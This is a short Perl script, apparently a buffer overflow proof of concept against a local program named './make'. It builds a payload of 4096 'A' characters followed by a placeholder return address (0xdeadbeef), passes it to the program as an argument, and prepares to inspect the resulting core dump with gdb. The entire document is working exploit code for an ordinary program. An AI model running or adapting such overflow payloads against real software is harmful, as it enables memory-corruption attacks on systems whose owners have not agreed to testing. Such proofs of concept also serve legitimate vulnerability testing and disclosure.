#!/usr/bin/perl
 
use 5.010;
use strict;
use warnings;
say "Please set ulimit value to 1000 before (ulimit -c 1000) ";
sleep 0.5;
 
 
my $buff = "A"x 4096 ;
my $addr = "\xef\xbe\xad\xde";
my $make = "./make";
my $gdb = "gdb --core core";
my $PAYLOAD= (`perl -e 'print "$buff" . "$addr" '`);
 
my $exec= qx($make $PAYLOAD);
 
say " Reading Core file GDB ";
sleep 0.5;
